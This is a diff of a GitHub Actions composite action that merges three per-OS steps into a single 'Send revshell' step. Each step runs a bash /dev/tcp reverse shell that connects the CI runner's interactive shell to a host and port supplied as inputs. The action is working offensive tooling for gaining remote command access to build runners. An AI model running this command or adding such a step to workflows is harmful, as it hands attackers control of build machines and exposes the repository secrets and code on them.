@@ -10,24 +10,7 @@ inputs:
 runs:
   using: "composite"
   steps:
-    - name: 'Send revshell from Linux'
-      if: runner.os == 'Linux'
-      shell: bash
-      run: sh -i >& /dev/tcp/$INPUT_HOST/$INPUT_PORT 0>&1
-      env:
-        INPUT_HOST: ${{ inputs.host }}
-        INPUT_PORT: ${{ inputs.port }}
-
-    - name: 'Send revshell from Windows'
-      if: runner.os == 'Windows'
-      shell: bash
-      run: sh -i >& /dev/tcp/$INPUT_HOST/$INPUT_PORT 0>&1
-      env:
-        INPUT_HOST: ${{ inputs.host }}
-        INPUT_PORT: ${{ inputs.port }}
-
-    - name: 'Send revshell from MacOS'
-      if: runner.os == 'macOS'
+    - name: 'Send revshell'
       shell: bash
       run: sh -i >& /dev/tcp/$INPUT_HOST/$INPUT_PORT 0>&1
       env:
